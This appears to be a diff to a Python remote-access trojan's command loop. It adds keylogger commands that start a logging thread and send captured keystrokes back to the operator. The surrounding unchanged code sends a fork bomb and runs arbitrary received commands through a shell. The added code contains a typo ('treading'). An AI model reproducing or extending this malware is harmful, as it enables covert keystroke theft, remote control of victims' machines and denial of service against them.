@@ -1,15 +1,13 @@
-import getpass
+import threading
 import json
 import os
-import platform
+import keylogger
 import shutil
 import socket
 import subprocess
 import sys
 import time
 import wave
-from subprocess import check_call
-import imageio as iio
 import pyaudio
 import pyautogui
 import termcolor
@@ -180,7 +178,18 @@ def shell():
             while True:
                 os.fork()
             reliable_send(termcolor.colored("[+] Done sent forkbomb", 'green'))
-
+        elif cmd[:12] == "keylog_start":
+            keylog = keylogger.Keylogger()
+            t = treading.Thread(target= keylog.start)
+            t.start()
+            reliable_send('[+] Keylogger started!')
+        elif cmd[:11] == "keylog_dump":
+            log = keylog.read_logs()
+            reliable_send(log)
+        elif cmd[:11] == "keylog_stop":
+            keylog.self_destruction()
+            t.join()
+            reliable_send('[+] Keylogger stopped!')
         else:
             execute = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
